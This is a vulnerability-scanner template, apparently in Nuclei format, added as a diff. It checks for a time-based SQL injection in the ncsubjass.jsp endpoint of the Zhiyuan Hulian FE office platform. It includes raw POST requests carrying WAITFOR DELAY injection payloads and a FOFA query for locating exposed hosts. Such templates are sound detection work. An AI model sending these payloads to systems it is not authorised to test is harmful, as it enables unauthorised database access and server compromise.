@@ -1,0 +1,37 @@
+http:
+    - matchers:
+        - condition: and
+          dsl:
+            - duration_1>=5 && duration_1<=6
+            - duration_2>=8 && duration_2<=9
+          type: dsl
+        - status:
+            - 200
+          type: status
+      matchers-condition: and
+      raw:
+        - |
+          POST /fenc/ncsubjass.j%73p HTTP/1.1
+          Host: {{Hostname}}
+          User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
+          Content-Type: application/x-www-form-urlencoded
+
+          subjcode=';WAITFOR DELAY '0:0:5'--
+        - |
+          POST /fenc/ncsubjass.j%73p HTTP/1.1
+          Host: {{Hostname}}
+          User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
+          Content-Type: application/x-www-form-urlencoded
+
+          subjcode=';WAITFOR DELAY '0:0:8'--
+id: zhiyuanhulianFE-ncsubjass-sql-injection
+info:
+    author: Superhero
+    description: |-
+        fofa: body="li_plugins_download"
+        致远互联FE协作办公平台 ncsubjass.jsp接口处存在SQL注入漏洞,未经身份验证的攻击者可以通过此漏洞获取数据库敏感信息，深入利用可获取服务器权限。
+    name: 致远互联FE协作办公平台 ncsubjass SQL延时注入
+    reference:
+        - https://mp.weixin.qq.com/s?__biz=MzkzMTcwMTg1Mg==&mid=2247484463&idx=1&sn=02be095232c94202a132698ce1a242ae&chksm=c267b11cf510380a2e32b5391576feb65369fde9753b25d1da80170eb50e2d8ddbce3bd238ad&token=1619136955&lang=zh_CN#rd
+    severity: high
+    tags: []
